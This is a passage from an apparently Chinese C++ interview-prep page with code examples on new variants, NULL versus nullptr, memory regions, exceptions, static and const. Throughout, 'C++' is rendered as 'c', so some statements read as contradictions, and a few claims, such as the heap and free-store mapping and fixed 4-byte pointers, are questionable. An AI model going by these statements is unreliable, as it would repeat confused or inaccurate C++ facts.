punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">throw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>nothrow<span class="token punctuation">)</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">10e11</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"alloc failed"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>delete p<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//运行结果：alloc failed</span></code></pre><p>（3）<strong>placement new</strong></p><p>这种new允许在一块已经分配成功的内存上重新构造对象或对象数组。placement new不用担心内存分配失败，因为它根本不分配内存，它做的唯一一件事情就是调用对象的构造函数。定义如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token operator">*</span> operator <span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> operator <span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">,</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用placement new需要注意两点：</p><ul><li><p>palcement new的主要用途就是反复使用一块较大的动态分配的内存来构造不同类型的对象或者他们的数组</p></li><li><p>placement new构造起来的对象数组，要显式的调用他们的析构函数来销毁（析构函数并不释放对象的内存），千万不要使用delete，这是因为placement new构造起来的对象或数组大小并不一定等于原来分配的内存大小，使用delete会造成内存泄漏或者之后释放内存时出现运行时错误。</p></li></ul><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>using namespace std<span class="token punctuation">;</span>class ADT<span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">int</span> j<span class="token punctuation">;</span>public<span class="token operator">:</span><span class="token function">ADT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>j <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ADT construct i="</span> <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">"j="</span><span class="token operator">&lt;&lt;</span>j <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">~</span><span class="token function">ADT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ADT destruct"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>nothrow<span class="token punctuation">)</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token keyword">sizeof</span> ADT <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"alloc failed"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ADT <span class="token operator">*</span>q <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> ADT<span class="token punctuation">;</span>  <span class="token comment">//placement new:不必担心失败，只要p所指对象的的空间足够ADT创建即可</span><span class="token comment">//delete q;//错误!不能在此处调用delete q;</span>q<span class="token operator">-></span>ADT<span class="token operator">::</span><span class="token operator">~</span><span class="token function">ADT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//显示调用析构函数</span>delete<span class="token punctuation">[</span><span class="token punctuation">]</span> p<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果：</span><span class="token comment">//ADT construct i=10j=100</span><span class="token comment">//ADT destruct</span></code></pre><blockquote><p>《【c】几种类型的new介绍》：<a href="https://www.jianshu.com/p/9b57e769c3cb">https://www.jianshu.com/p/9b57e769c3cb</a></p></blockquote><h4 id="47、c中NULL和nullptr区别"><a href="#47、c中NULL和nullptr区别" class="headerlink" title="47、c中NULL和nullptr区别"></a>47、c中NULL和nullptr区别</h4><p>算是为了与C语言进行兼容而定义的一个问题吧</p><p>NULL来自C语言，一般由宏定义实现，而 nullptr 则是c11的新增关键字。<strong>在C语言中，NULL被定义为(void*)0,而在c语言中，NULL则被定义为整数0</strong>。编译器一般对其实际定义如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__cplusplus</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NULL</span> <span class="token expression"><span class="token number">0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NULL</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span></code></pre><p>在c中指针必须有明确的类型定义。但是将NULL定义为0带来的另一个问题是无法与整数的0区分。因为c中允许有函数重载，所以可以试想如下函数定义情况：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"char*"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"int"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果：int</span></code></pre><p>那么<strong>在传入NULL参数时，会把NULL当做整数0来看，如果我们想调用参数是指针的函数，该怎么办呢?。nullptr在c11被引入用于解决这一问题，nullptr可以明确区分整型和指针类型，能够根据环境自动转换成相应的指针类型，但不会被转换为任何整型，所以不会造成参数传递错误。</strong></p><p>nullptr的一种实现方式如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> class <span class="token class-name">nullptr_t</span><span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    template<span class="token operator">&lt;</span>class T<span class="token operator">></span>  <span class="token keyword">inline</span> operator T<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    template<span class="token operator">&lt;</span>class C<span class="token punctuation">,</span> class T<span class="token operator">></span> <span class="token keyword">inline</span> operator T C<span class="token operator">::</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>private<span class="token operator">:</span>    <span class="token keyword">void</span> operator<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> nullptr <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>以上通过模板类和运算符重载的方式来对不同类型的指针进行实例化从而解决了(void<em>)指针带来参数类型不明的问题，<em>*另外由于nullptr是明确的指针类型，所以不会与整形变量相混淆。</em></em>但nullptr仍然存在一定问题，例如：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout<span class="token operator">&lt;&lt;</span> <span class="token string">"char* p"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout<span class="token operator">&lt;&lt;</span> <span class="token string">"int* p"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout<span class="token operator">&lt;&lt;</span> <span class="token string">"int p"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//语句1</span><span class="token function">fun</span><span class="token punctuation">(</span>nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//语句2</span>    <span class="token function">fun</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//语句3</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//运行结果：</span><span class="token comment">//语句1：char* p</span><span class="token comment">//语句2:报错，有多个匹配</span><span class="token comment">//3：int p</span></code></pre><p>在这种情况下存在对不同指针类型的函数重载，此时如果传入nullptr指针则仍然存在无法区分应实际调用哪个函数，这种情况下必须显示的指明参数类型。</p><blockquote><p>《NULL和nullptr区别》：<a href="https://blog.csdn.net/qq_39380590/article/details/82563571">https://blog.csdn.net/qq_39380590/article/details/82563571</a></p></blockquote><h4 id="48、简要说明c的内存分区"><a href="#48、简要说明c的内存分区" class="headerlink" title="48、简要说明c的内存分区"></a>48、简要说明c的内存分区</h4><p>c中的内存分区，分别是堆、栈、自由存储区、全局/静态存储区、常量存储区和代码区。如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1564479734552.png" alt=""></p><p>　　</p><p><strong>栈</strong>：在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限</p><p><strong>堆</strong>：就是那些由 <code>new</code>分配的内存块，他们的释放编译器不去管，由我们的应用程序去控制，一般一个<code>new</code>就要对应一个 <code>delete</code>。如果程序员没有释放掉，那么在程序结束后，操作系统会自动回收</p><p><strong>自由存储区</strong>：就是那些由<code>malloc</code>等分配的内存块，它和堆是十分相似的，不过它是用<code>free</code>来结束自己的生命的</p><p><strong>全局/静态存储区</strong>：全局变量和静态变量被分配到同一块内存中，在以前的C语言中，全局变量和静态变量又分为初始化的和未初始化的，在c里面没有这个区分了，它们共同占用同一块内存区，在该区定义的变量若没有初始化，则会被自动初始化，例如int型变量自动初始为0</p><p><strong>常量存储区</strong>：这是一块比较特殊的存储区，这里面存放的是常量，不允许修改</p><p><strong>代码区</strong>：存放函数体的二进制代码</p><blockquote><p>《C/c内存管理详解》：<a href="https://chenqx.github.io/2014/09/25/Cpp-Memory-Management/">https://chenqx.github.io/2014/09/25/Cpp-Memory-Management/</a></p></blockquote><h4 id="49、c的异常处理的方法"><a href="#49、c的异常处理的方法" class="headerlink" title="49、c的异常处理的方法"></a>49、c的异常处理的方法</h4><p>在程序执行过程中，由于程序员的疏忽或是系统资源紧张等因素都有可能导致异常，任何程序都无法保证绝对的稳定，常见的异常有：</p><ul><li>数组下标越界</li><li>除法计算时除数为0</li><li>动态分配空间时空间不足</li><li>…</li></ul><p>如果不及时对这些异常进行处理，程序多数情况下都会崩溃。</p><p><strong>（1）try、throw和catch关键字</strong></p><p>c中的异常处理机制主要使用<strong>try</strong>、<strong>throw</strong>和<strong>catch</strong>三个关键字，其在程序中的用法如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">double</span> m <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    try <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"before dividing."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            throw <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">//抛出int型异常</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            throw <span class="token operator">-</span> <span class="token number">1.0</span><span class="token punctuation">;</span>  <span class="token comment">//拋出 double 型异常</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> m <span class="token operator">/</span> n <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"after dividing."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">catch</span> <span class="token punctuation">(</span><span class="token keyword">double</span> d<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"catch (double)"</span> <span class="token operator">&lt;&lt;</span> d <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">catch</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"catch (...)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"finished"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//运行结果</span><span class="token comment">//before dividing.</span><span class="token comment">//catch (...)</span><span class="token comment">//finished</span></code></pre><p>代码中，对两个数进行除法计算，其中除数为0。可以看到以上三个关键字，程序的执行流程是先执行try包裹的语句块，如果执行过程中没有异常发生，则不会进入任何catch包裹的语句块，如果发生异常，则使用throw进行异常抛出，再由catch进行捕获，throw可以抛出各种数据类型的信息，代码中使用的是数字，也可以自定义异常class。<strong>catch根据throw抛出的数据类型进行精确捕获（不会出现类型转换），如果匹配不到就直接报错，可以使用catch(…)的方式捕获任何异常（不推荐）。</strong>当然，如果catch了异常，当前函数如果不进行处理，或者已经处理了想通知上一层的调用者，可以在catch里面再throw异常。</p><p><strong>（2）函数的异常声明列表</strong></p><p>有时候，程序员在定义函数的时候知道函数可能发生的异常，可以在函数声明和定义时，指出所能抛出异常的列表，写法如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">throw</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">,</span>A<span class="token punctuation">,</span>B<span class="token punctuation">,</span>C<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>这种写法表名函数可能会抛出int,double型或者A、B、C三种类型的异常，如果throw中为空，表明不会抛出任何异常，如果没有throw则可能抛出任何异常</p><p><strong>（3）c标准异常类  exception</strong></p><p>c 标准库中有一些类代表异常，这些类都是从 exception 类派生而来的，如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1-1P912101914246.jpg" alt=""></p><ul><li>bad_typeid：使用typeid运算符，如果其操作数是一个多态类的指针，而该指针的值为 NULL，则会拋出此异常，例如：</li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;typeinfo></span></span>using namespace std<span class="token punctuation">;</span>class A<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>  virtual <span class="token operator">~</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>A<span class="token operator">*</span> a <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>try <span class="token punctuation">&#123;</span>  cout <span class="token operator">&lt;&lt;</span> <span class="token function">typeid</span><span class="token punctuation">(</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// Error condition</span>  <span class="token punctuation">&#125;</span><span class="token function">catch</span> <span class="token punctuation">(</span>bad_typeid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Object is NULL"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//运行结果：bject is NULL</span></code></pre><ul><li>bad_cast：在用 dynamic_cast 进行从多态基类对象（或引用）到派生类的引用的强制类型转换时，如果转换是不安全的，则会拋出此异常</li><li>bad_alloc：在用 new 运算符进行动态内存分配时，如果没有足够的内存，则会引发此异常</li><li>out_of_range:用 vector 或 string的at 成员函数根据下标访问元素时，如果下标越界，则会拋出此异常</li></ul><blockquote><p>《c异常处理（try catch throw）完全攻略》：<a href="http://c.biancheng.net/view/422.html">http://c.biancheng.net/view/422.html</a></p></blockquote><h4 id="50、static的用法和作用？"><a href="#50、static的用法和作用？" class="headerlink" title="50、static的用法和作用？"></a>50、static的用法和作用？</h4><p>1.先来介绍它的第一条也是最重要的一条：隐藏。（static函数，static变量均可）</p><p>当同时编译多个文件时，所有未加static前缀的全局变量和函数都具有全局可见性。</p><p>2.static的第二个作用是保持变量内容的持久。（static变量中的记忆功能和全局生存期）存储在静态数据区的变量会在程序刚开始运行时就完成初始化，也是唯一的一次初始化。共有两种变量存储在静态存储区：全局变量和static变量，只不过和全局变量比起来，static可以控制变量的可见范围，说到底static还是用来隐藏的。</p><p>3.static的第三个作用是默认初始化为0（static变量）</p><p>其实全局变量也具备这一属性，因为全局变量也存储在静态数据区。在静态数据区，内存中所有的字节默认值都是0x00，某些时候这一特点可以减少程序员的工作量。</p><p>4.static的第四个作用：c中的类成员声明static</p><p>1)  函数体内static变量的作用范围为该函数体，不同于auto变量，该变量的内存只被分配一次，因此其值在下次调用时仍维持上次的值； </p><p>2)  在模块内的static全局变量可以被模块内所用函数访问，但不能被模块外其它函数访问；  </p><p>3)  在模块内的static函数只可被这一模块内的其它函数调用，这个函数的使用范围被限制在声明它的模块内；  </p><p>4)  在类中的static成员变量属于整个类所拥有，对类的所有对象只有一份拷贝；  </p><p>5)  在类中的static成员函数属于整个类所拥有，这个函数不接收this指针，因而只能访问类的static成员变量。</p><p>类内：</p><p>6)  static类对象必须要在类外进行初始化，static修饰的变量先于对象存在，所以static修饰的变量要在类外初始化；</p><p>7)  由于static修饰的类成员属于类，不属于对象，因此static类成员函数是没有this指针的，this指针是指向本对象的指针。正因为没有this指针，所以static类成员函数不能访问非static的类成员，只能访问 static修饰的类成员；</p><p>8)  static成员函数不能被virtual修饰，static成员不属于任何对象或实例，所以加上virtual没有任何实际意义；静态成员函数没有this指针，虚函数的实现是为每一个对象分配一个vptr指针，而vptr是通过this指针调用的，所以不能为virtual；虚函数的调用关系，this-&gt;vptr-&gt;ctable-&gt;virtual function</p><h4 id="51、静态变量什么时候初始化"><a href="#51、静态变量什么时候初始化" class="headerlink" title="51、静态变量什么时候初始化"></a>51、静态变量什么时候初始化</h4><p>1)  初始化只有一次，但是可以多次赋值，在主程序之前，编译器已经为其分配好了内存。</p><p>2)  静态局部变量和全局变量一样，数据都存放在全局区域，所以在主程序之前，编译器已经为其分配好了内存，但在C和c中静态局部变量的初始化节点又有点不太一样。在C中，初始化发生在代码执行之前，编译阶段分配好内存之后，就会进行初始化，所以我们看到在C语言中无法使用变量对静态局部变量进行初始化，在程序运行结束，变量所处的全局内存会被全部回收。</p><p>3)  而在c中，初始化时在执行相关代码时才会进行初始化，主要是由于c引入对象后，要进行初始化必须执行相应构造函数和析构函数，在构造函数或析构函数中经常会需要进行某些程序中需要进行的特定操作，并非简单地分配内存。所以c标准定为全局或静态对象是有首次用到时才会进行构造，并通过atexit()来管理。在程序结束，按照构造顺序反方向进行逐个析构。所以在c中是可以使用变量对静态局部变量进行初始化的。</p><h4 id="52、const关键字"><a href="#52、const关键字" class="headerlink" title="52、const关键字?"></a>52、const关键字?</h4><p>1)  阻止一个变量被改变，可以使用const关键字。在定义该const变量时，通常需要对它进行初始化，因为以后就没有机会再去改变它了；  </p><p>2)  对指针来说，可以指定指针本身为const，也可以指定指针所指的数据为const，或二者同时指定为const；  </p><p>3)  在一个函数声明中，const可以修饰形参，表明它是一个输入参数，在函数内部不能改变其值；  </p><p>4)  对于类的成员函数，若指定其为const类型，则表明其是一个常函数，不能修改类的成员变量，类的常对象只能访问类的常成员函数；  </p><p>5)  对于类的成员函数，有时候必须指定其返回值为const类型，以使得其返回值不为“左值”。</p><p>6)  const成员函数可以访问非const对象的非const数据成员、const数据成员，也可以访问const对象内的所有数据成员；</p><p>7)  非const成员函数可以访问非const对象的非const数据成员、const数据成员，但不可以访问const对象的任意数据成员；</p><p>8)  一个没有明确声明为const的成员函数被看作是将要修改对象中数据成员的函数，而且编译器不允许它为一个const对象所调用。因此const对象只能调用const成员函数。</p><p>9)  const类型变量可以通过类型转换符const_cast将const类型转换为非const类型；</p><p>10) const类型变量必须定义的时候进行初始化，因此也导致如果类的成员变量有const类型的变量，那么该变量必须在类的初始化列表中进行初始化；</p><p>11) 对于函数值传递的情况，因为参数传递是通过复制实参创建一个临时变量传递进函数的，函数内只能改变临时变量，但无法改变实参。则这个时候无论加不加const对实参不会产生任何影响。但是在引用或指针传递函数调用中，因为传进去的是一个引用或指针，这样函数内部可以改变引用或指针所指向的变量，这时const 才是实实在在地保护了实参所指向的变量。因为在编译阶段编译器对调用函数的选择是根据实参进行的，所以，只有引用传递和指针传递可以用是否加const来重载。一个拥有顶层const的形参无法和另一个没有顶层const的形参区分开来。</p><h4 id="53、指针和const的用法"><a href="#53、指针和const的用法" class="headerlink" title="53、指针和const的用法"></a>53、指针和const的用法</h4><p>1)  当const修饰指针时，由于const的位置不同，它的修饰对象会有所不同。</p><p>2)  int *const p2中const修饰p2的值,所以理解为p2的值不可以改变，即p2只能指向固定的一个变量地址，但可以通过*p2读写这个变量的值。顶层指针表示指针本身是一个常量</p><p>3)  int const *p1或者const int *p1两种情况中const修饰*p1，所以理解为*p1的值不可以改变，即不可以给*p1赋值改变p1指向变量的值，但可以通过给p赋值不同的地址改变这个指针指向。</p><p>底层指针表示指针所指向的变量是一个常量。</p><h4 id="54、形参与实参的区别？"><a href="#54、形参与实参的区别？" class="headerlink" title="54、形参与实参的区别？"></a>54、形参与实参的区别？</h4><p>1)  形参变量只有在被调用时才分配内存单元，在调用结束时， 即刻释放所分配的内存单元。因此，形参只有在函数内部有效。 函数调用结束返回主调函数后则不能再使用该形参变量。</p><p>2)  实参可以是常量、变量、表达式、函数等， 无论实参是何种类型的量，在进行函数调用时，它们都必须具有确定的值， 以便把这些值传送给形参。 因此应预先用赋值，输入等办法使实参获得确定值，会产生一个临时变量。</p><p>3)  实参和形参在数量上，类型上，顺序上应严格一致， 否则会发生“类型不匹配”的错误。</p><p>4)  函数调用中发生的数据传送是单向的。 即只能把实参的值传送给形参，而不能把形参的值反向地传送给实参。 因此在函数调用过程中，形参的值发生改变，而实参中的值不会变化。</p><p>5)  当形参和实参不是指针类型时，在该函数运行时，形参和实参是不同的变量，他们在内存中位于不同的位置，形参将实参的内容复制一份，在该函数运行结束的时候形参被释放，而实参内容不会改变。</p><h4 id="55、值传递、指针传递、引用传递的区别和效率"><a href="#55、值传递、指针传递、引用传递的区别和效率" class="headerlink" title="55、值传递、指针传递、引用传递的区别和效率"></a>55、值传递、指针传递、引用传递的区别和效率</h4><p>1)   值传递：有一个形参向函数所属的栈拷贝数据的过程，如果值传递的对象是类对象   或是大的结构体对象，将耗费一定的时间和空间。（传值）</p><p>2)  指针传递：同样有一个形参向函数所属的栈拷贝数据的过程，但拷贝的数据是一个固定为4字节的地址。（传值，传递的是地址值）</p><p>3)  引用传递：同样有上述的数据拷贝过程，但其是针对地址的，相当于为该数据所在的地址起了一个别名。（传地址）</p><p>4)  效率上讲，指针传递和引用传递比值传递效率高。一般主张使用引用传递，代码逻辑上更加紧凑、清晰。</p><h4 id="56、什么是类的继承？"><a href="#56、什么是类的继承？" class="headerlink" title="56、什么是类的继承？"></a>56、什么是类的继承？</h4><p>1) 类与类之间的关系</p><p>has-A包含关系，用以描述一个类由多个部件类构成，实现has-A关系用类的成员属性表示，即一个类的成员属性是另一个已经定义好的类；</p><p>use-A，一个类使用另一个类，通过类之间的成员函数相互联系，定义友元或者通过传递参数的方式来实现；</p><p>is-A，继承关系，关系具有传递性；</p><p>2) 继承的相关概念</p><p>所谓的继承就是一个类继承了另一个类的属性和方法，这个新的类包含了上一个类的属性和方法，被称为子类或者派生类，被继承的类称为父类或者基类；</p><p>3) 继承的特点</p><p>子类拥有父类的所有属性和方法，子类可以拥有父类没有的属性和方法，子类对象可以当做父类对象使用；</p><p>4) 继承中的访问控制</p><p>public、protected、private</p><p>5) 继承中的构造和析构函数</p><p>6) 继承中的兼容性原则</p><h4 id="57、什么是内存池，如何实现"><a href="#57、什么是内存池，如何实现" 